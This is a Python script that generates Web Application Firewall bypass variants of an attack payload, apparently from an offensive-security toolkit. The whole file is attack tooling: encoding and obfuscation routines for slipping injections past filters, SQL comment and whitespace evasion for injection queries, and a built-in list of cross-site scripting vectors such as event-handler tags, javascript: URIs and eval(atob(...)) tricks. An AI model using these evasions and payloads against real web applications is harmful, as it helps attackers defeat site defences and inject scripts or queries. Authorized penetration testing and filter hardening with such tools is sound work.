#!/usr/bin/env python3
"""WAF bypass payload generator.

Generates various encoded/obfuscated versions of a payload to bypass
Web Application Firewalls. Supports URL encoding, Unicode normalization,
double encoding, hex encoding, mixed case, comment injection, and HTML entities.

Usage:
    python3 generate-waf-bypass.py '{"payload": "<script>alert(1)</script>", "techniques": ["url_encode", "unicode", "double_encode", "hex", "html_entity"]}'
"""

import sys
import json
import html
from urllib.parse import quote, quote_plus


def url_encode(payload):
    """Standard URL encoding."""
    return [
        {"technique": "url_encode_full", "payload": quote(payload, safe="")},
        {"technique": "url_encode_partial", "payload": quote(payload, safe="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")},
        {"technique": "url_encode_plus", "payload": quote_plus(payload)},
    ]


def double_encode(payload):
    """Double URL encoding."""
    first_pass = quote(payload, safe="")
    second_pass = quote(first_pass, safe="")
    return [
        {"technique": "double_url_encode", "payload": second_pass},
    ]


def unicode_encode(payload):
    """Unicode normalization bypasses."""
    results = []

    # UTF-8 full-width encoding
    fullwidth_map = {}
    for i in range(0x21, 0x7F):
        fullwidth_map[chr(i)] = chr(i + 0xFEE0)

    fullwidth = "".join(fullwidth_map.get(c, c) for c in payload)
    results.append({"technique": "unicode_fullwidth", "payload": fullwidth})

    # Unicode escape sequences (\uXXXX)
    unicode_escape = "".join(f"\\u{ord(c):04x}" for c in payload)
    results.append({"technique": "unicode_escape", "payload": unicode_escape})

    # HTML Unicode (&#xHH;)
    unicode_html = "".join(f"&#x{ord(c):02x};" for c in payload)
    results.append({"technique": "unicode_html_hex", "payload": unicode_html})

    # Unicode decimal (&#DDD;)
    unicode_decimal = "".join(f"&#{ord(c)};" for c in payload)
    results.append({"technique": "unicode_html_decimal", "payload": unicode_decimal})

    # UTF-8 overlong encoding for '<' (0x3C)
    # 2-byte: C0 BC, 3-byte: E0 80 BC
    results.append({
        "technique": "utf8_overlong",
        "payload": payload.replace("<", "%C0%BC").replace(">", "%C0%BE"),
        "note": "UTF-8 overlong encoding of angle brackets",
    })

    return results


def hex_encode(payload):
    """Hex encoding variations."""
    results = []

    # JavaScript hex escape
    js_hex = "".join(f"\\x{ord(c):02x}" for c in payload)
    results.append({"technique": "hex_js_escape", "payload": js_hex})

    # CSS hex escape
    css_hex = "".join(f"\\{ord(c):02x} " for c in payload)
    results.append({"technique": "hex_css_escape", "payload": css_hex})

    # Hex without prefix
    raw_hex = "".join(f"{ord(c):02x}" for c in payload)
    results.append({"technique": "hex_raw", "payload": raw_hex})

    # 0x prefix hex
    ox_hex = "".join(f"0x{ord(c):02x}" for c in payload)
    results.append({"technique": "hex_0x_prefix", "payload": ox_hex})

    return results


def html_entity_encode(payload):
    """HTML entity encoding variations."""
    results = []

    # Named entities
    named = html.escape(payload, quote=True)
    results.append({"technique": "html_named_entities", "payload": named})

    # Numeric decimal entities
    decimal = "".join(f"&#{ord(c)};" for c in payload)
    results.append({"technique": "html_decimal_entities", "payload": decimal})

    # Numeric hex entities
    hex_ent = "".join(f"&#x{ord(c):x};" for c in payload)
    results.append({"technique": "html_hex_entities", "payload": hex_ent})

    # Zero-padded hex entities
    padded = "".join(f"&#x{ord(c):06x};" for c in payload)
    results.append({"technique": "html_padded_hex_entities", "payload": padded})

    # No semicolons (some parsers accept this)
    no_semi = "".join(f"&#{ord(c)}" for c in payload)
    results.append({"technique": "html_decimal_no_semicolon", "payload": no_semi})

    return results


def mixed_case(payload):
    """Mixed case variations."""
    results = []

    # Alternating case
    alternating = "".join(
        c.upper() if i % 2 == 0 else c.lower()
        for i, c in enumerate(payload)
    )
    results.append({"technique": "mixed_case_alternating", "payload": alternating})

    # Random case
    import random
    random_case = "".join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in payload
    )
    results.append({"technique": "mixed_case_random", "payload": random_case})

    # Uppercase
    results.append({"technique": "uppercase", "payload": payload.upper()})

    return results


def sql_comment_injection(payload):
    """SQL comment injection bypasses."""
    results = []

    # Inline comments
    commented = payload
    for keyword in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT",
                     "UPDATE", "DELETE", "DROP", "TABLE", "ORDER", "GROUP", "HAVING"]:
        lower_kw = keyword.lower()
        if lower_kw in payload.lower():
            idx = payload.lower().index(lower_kw)
            original_kw = payload[idx:idx + len(keyword)]
            inline_comment = f"/**/{original_kw}/**/"
            commented = commented.replace(original_kw, inline_comment, 1)
    results.append({"technique": "sql_inline_comments", "payload": commented})

    # MySQL version comments
    version_comment = payload.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/")
    results.append({"technique": "sql_version_comments", "payload": version_comment})

    # Whitespace substitution
    whitespace_variants = [
        payload.replace(" ", "/**/"),
        payload.replace(" ", "%09"),  # Tab
        payload.replace(" ", "%0a"),  # Newline
        payload.replace(" ", "%0d"),  # Carriage return
        payload.replace(" ", "%0b"),  # Vertical tab
        payload.replace(" ", "%a0"),  # Non-breaking space
    ]
    for i, variant in enumerate(whitespace_variants):
        ws_names = ["comment", "tab", "newline", "cr", "vtab", "nbsp"]
        results.append({
            "technique": f"sql_whitespace_{ws_names[i]}",
            "payload": variant,
        })

    return results


def xss_bypasses(payload):
    """XSS-specific bypass techniques."""
    results = []

    # Event handler variations
    if "script" in payload.lower():
        alternatives = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<isindex type=image src=x onerror=alert(1)>',
            'javascript:alert(1)//',
            '<a href="javascript:alert(1)">click</a>',
            '<iframe src="javascript:alert(1)">',
        ]
        for alt in alternatives:
            results.append({"technique": "xss_alternative_tag", "payload": alt})

    # JS string escape
    results.append({
        "technique": "xss_js_constructor",
        "payload": "[].constructor.constructor('alert(1)')()",
    })
    results.append({
        "technique": "xss_string_fromcharcode",
        "payload": "String.fromCharCode(97,108,101,114,116,40,49,41)",
    })
    results.append({
        "technique": "xss_atob",
        "payload": "eval(atob('YWxlcnQoMSk='))",
    })

    return results


def generate_all_bypasses(payload, techniques):
    """Generate all bypass variations for a payload."""
    all_bypasses = []

    technique_map = {
        "url_encode": url_encode,
        "double_encode": double_encode,
        "unicode": unicode_encode,
        "hex": hex_encode,
        "html_entity": html_entity_encode,
        "mixed_case": mixed_case,
        "sql_comment": sql_comment_injection,
        "xss": xss_bypasses,
    }

    for technique in techniques:
        func = technique_map.get(technique)
        if func:
            try:
                results = func(payload)
                all_bypasses.extend(results)
            except Exception as e:
                all_bypasses.append({
                    "technique": technique,
                    "error": str(e),
                })
        else:
            all_bypasses.append({
                "technique": technique,
                "error": f"Unknown technique: {technique}",
            })

    return all_bypasses


def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: generate-waf-bypass.py '{\"payload\": \"...\", \"techniques\": [...]}' "}))
        sys.exit(1)

    try:
        args = json.loads(sys.argv[1])
    except json.JSONDecodeError as e:
        print(json.dumps({"error": f"Invalid JSON arguments: {str(e)}"}))
        sys.exit(1)

    payload = args.get("payload")
    if not payload:
        print(json.dumps({"error": "Missing required parameter: payload"}))
        sys.exit(1)

    techniques = args.get("techniques", [
        "url_encode", "double_encode", "unicode", "hex",
        "html_entity", "mixed_case", "sql_comment", "xss",
    ])

    bypasses = generate_all_bypasses(payload, techniques)

    output = {
        "original_payload": payload,
        "techniques_applied": techniques,
        "total_variants": len(bypasses),
        "bypasses": bypasses,
        "usage_note": (
            "These payloads are generated for WAF bypass testing. "
            "Test each variant against the target to identify which encodings bypass filtering."
        ),
    }

    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
